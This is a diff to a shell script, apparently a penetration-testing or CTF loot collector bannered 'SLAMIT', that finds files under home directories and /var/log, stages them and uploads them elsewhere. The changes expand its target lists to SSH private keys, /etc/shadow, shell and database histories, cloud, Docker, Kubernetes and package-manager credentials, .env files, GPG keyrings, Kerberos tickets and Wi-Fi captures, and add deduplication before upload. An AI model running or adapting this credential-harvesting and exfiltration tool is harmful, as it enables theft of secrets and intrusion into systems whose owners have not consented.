@@ -35,8 +35,10 @@ BOUNDARY="----BOUNDARY-$$"
 DIVIDER="================================================================"
 SYSTEM_HAS_CURL=1
 
-echo "\n\n\n";
 cat <<'EOF'
+
+
+
                            _________.____       _____      _____  .______________
                           /   _____/|    |     /  _  \    /     \ |   \__    ___/
                           \_____  \ |    |    /  /_\  \  /  \ /  \|   | |    |   
@@ -98,8 +100,10 @@ cat <<'EOF'
 .............................................%##########............................................
 .....................................%#########################.....................................
 ......................................::::::::::::::::::::::::......................................
+
+
+
 EOF
-echo "\n\n\n";
 
 printSectionTitle() 
 {
@@ -244,8 +248,15 @@ echo "Created staging directory: $STAGING_DIR"
 # Space-separated list of extensions (exclude .sh to avoid script contamination)
 EXTENSIONS="pdf txt log zip doc docx xls xlsx ppt pptx csv ini conf cfg env
     yaml yml json xml kdbx rdp 7z rar tar gz bak old tmp db sqlite
-    sqlite3 mdb accdb rtf md";
-SPECIFIC_FILES="proof.txt local.txt id_rsa id_ecdsa \.git* /etc/passwd /etc/shadow";
+    sqlite3 mdb accdb rtf md pem p12 pfx key crt cer p7b p7c
+    kerberoast kirb ccache hccapx wpa pcap pcapng cap";
+SPECIFIC_FILES="proof.txt local.txt id_rsa id_ecdsa id_ed25519 id_dsa \.git* /etc/passwd /etc/shadow
+    .bash_history .zsh_history .mysql_history .psql_history .rediscli_history
+    .ssh/known_hosts .ssh/config .aws/credentials .aws/config
+    .docker/config.json .kube/config .npmrc .pip/pip.conf
+    .netrc .my.cnf .pgpass .ldaprc .subversion/config
+    .env .env.local .env.production
+    .gnupg/secring.gpg .gnupg/pubring.gpg .gnupg/trustdb.gpg";
 
 # MODIFY THIS to search in different directories.
 DIRECTORIES="$HOME /home /var/log";
@@ -290,10 +301,25 @@ echo "Staging discovered files to prevent duplicates..."
 
 # Use temporary files to avoid subshell variable scope issues
 STAGED_FILES_LIST=$(mktemp)
+UNIQUE_FILES_LIST=$(mktemp)
 STAGED_COUNT=0
 
-# Evaluate the find command and stage files
+# Evaluate the find command and collect unique files (by inode to prevent duplicates)
 eval "$FIND_CMD" | while IFS= read -r FILE; do
+    if [ -f "$FILE" ] && [ -r "$FILE" ]; then
+        # Get file inode to check for duplicates
+        INODE=$(stat -c %i "$FILE" 2>/dev/null || echo "")
+        if [ -n "$INODE" ]; then
+            # Check if we've already seen this inode
+            if ! grep -q "^$INODE:" "$UNIQUE_FILES_LIST" 2>/dev/null; then
+                echo "$INODE:$FILE" >> "$UNIQUE_FILES_LIST"
+            fi
+        fi
+    fi
+done
+
+# Now process unique files and stage them
+while IFS=: read -r INODE FILE; do
     if [ -f "$FILE" ] && [ -r "$FILE" ]; then
         FILENAME=$(basename "$FILE")
         
@@ -317,7 +343,7 @@ eval "$FIND_CMD" | while IFS= read -r FILE; do
             echo "Failed to stage: $FILENAME"
         fi
     fi
-done
+done < "$UNIQUE_FILES_LIST"
 
 # Get the actual count of staged files
 STAGED_COUNT=$(wc -l < "$STAGED_FILES_LIST" 2>/dev/null || echo "0")
@@ -411,18 +437,18 @@ while IFS= read -r STAGED_FILE; do
     fi
 done < "$STAGED_FILES_LIST"
 
-# Clean up temporary file
-rm -f "$STAGED_FILES_LIST"
+# Clean up temporary files
+rm -f "$STAGED_FILES_LIST" "$UNIQUE_FILES_LIST"
 
 # Pretty print summary
 echo ""
-echo "╔══════════════════════════════════════════════════════════════════════════════╗"
-echo "║                              UPLOAD SUMMARY                                 ║"
-echo "╠══════════════════════════════════════════════════════════════════════════════╣"
-echo "║  Total Files Processed: $(printf "%8d" $UPLOAD_COUNT)                                                    ║"
-echo "║  Successfully Uploaded: $(printf "%8d" $SUCCESS_COUNT)                                                    ║"
-echo "║  Failed Uploads:        $(printf "%8d" $FAILED_COUNT)                                                    ║"
-echo "╚══════════════════════════════════════════════════════════════════════════════╝"
+echo "=================================================================================="
+echo "                              UPLOAD SUMMARY"
+echo "=================================================================================="
+echo "  Total Files Processed: $(printf "%8d" $UPLOAD_COUNT)"
+echo "  Successfully Uploaded: $(printf "%8d" $SUCCESS_COUNT)"
+echo "  Failed Uploads:        $(printf "%8d" $FAILED_COUNT)"
+echo "=================================================================================="
 echo ""
 
 echo "Upload complete! Total files uploaded: $UPLOAD_COUNT"
